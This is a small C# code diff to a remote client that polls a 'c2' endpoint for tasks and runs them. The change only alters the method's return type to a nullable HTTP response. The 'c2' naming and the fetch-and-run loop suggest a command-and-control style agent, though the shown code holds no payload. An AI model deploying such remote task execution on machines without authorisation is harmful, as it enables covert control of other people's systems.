@@ -15,7 +15,7 @@ namespace nucleus_remote_client.Client
     {
         private static readonly HashSet<string> RunnedTasks = new();
 
-        public async Task ExecuteAsync(HostSettings hostSettings)
+        public async Task<HttpResponseMessage?> ExecuteAsync(HostSettings hostSettings)
         {
             var client = ClientHelper.GetHttpClient(hostSettings);
             var tasks = await client.GetFromJsonAsync<TaskContainer[]>($"c2/{hostSettings.Id}/tasks");
@@ -23,7 +23,7 @@ namespace nucleus_remote_client.Client
             if (tasks == null)
             {
                 await SendLog.Error(hostSettings, "Cannot parse get tasks response");
-                return;
+                return null;
             }
 
             foreach (var taskContainer in tasks.Where(task => Runnable(task)))
@@ -47,6 +47,8 @@ namespace nucleus_remote_client.Client
                     await SendLog.Error(hostSettings, $"[Task {taskContainer.Name}]: " + ex.Message);
                 }
             }
+
+            return null;
         }
 
         private static bool Runnable(TaskContainer taskContainer)
